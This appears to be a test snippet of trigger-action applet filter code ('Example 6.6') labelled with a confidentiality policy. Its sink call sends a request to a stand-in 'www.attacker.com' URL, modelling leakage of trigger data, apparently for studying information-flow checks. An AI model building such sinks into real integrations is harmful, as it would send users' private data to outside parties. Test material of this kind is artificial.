// Filter code in Example 6.6
// Maker: ---
// Link : ---

// Trigger: ---
// Action: ---

// Policy/Presence: Confidentiality of trigger data / Yes

h = false;
url = urll("www.attacker.com");
if (h) {
	skip('Sink');
}
sink('Sink', '', url);
